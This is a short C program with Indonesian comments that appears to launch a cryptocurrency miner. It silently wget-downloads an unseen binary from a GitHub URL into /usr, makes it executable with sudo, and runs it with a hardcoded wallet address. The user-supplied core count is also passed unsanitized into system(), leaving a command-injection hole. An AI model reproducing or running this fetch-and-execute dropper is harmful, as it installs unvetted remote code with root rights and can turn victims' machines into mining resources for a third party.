#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

int main() {
    char qcore[20];
    char wallet[] = "8BAei31qDSqCRwS1GsQTWjfMjK4VxxThbFckHFoXyRP1BM2keM3bNCY9YBvpGmwuxG4Nec7gqejYGU8E4VNHXYYC7Y2EUJZ"; // Default wallet
    char command[256];
    
    // Mendownload file ke /usr directory dengan sudo
    int download_status = system("wget -q https://github.com/gualgeol-code/vpl/raw/refs/heads/main/sx -O /usr/sx >/dev/null 2>&1");
    
    if (download_status != 0) {
        printf("Error: Gagal mendownload sx ke /usr\n");
        return 1;
    }
    
    // Memberikan izin eksekusi dengan sudo
    int chmod_status = system("sudo chmod +x /usr/sx >/dev/null 2>&1");
    
    if (chmod_status != 0) {
        printf("Error: Gagal memberikan izin eksekusi pada /usr/sx\n");
        return 1;
    }
    
    // Menampilkan prompt input untuk core saja
    printf("Masukan jumlah core: ");
    fflush(stdout);
    
    if (fgets(qcore, sizeof(qcore), stdin) == NULL) {
        return 1;
    }
    
    // Menghapus newline character dari input
    qcore[strcspn(qcore, "\n")] = '\0';
    
    // Membuat command dengan wallet default dan path lengkap ke sx
    snprintf(command, sizeof(command), "/usr/sx %s %s", qcore, wallet);
    
    // Menjalankan program dengan wallet default
    int status = system(command);
    
    if (status == -1) {
        return 1;
    }
    
    return 0;
}
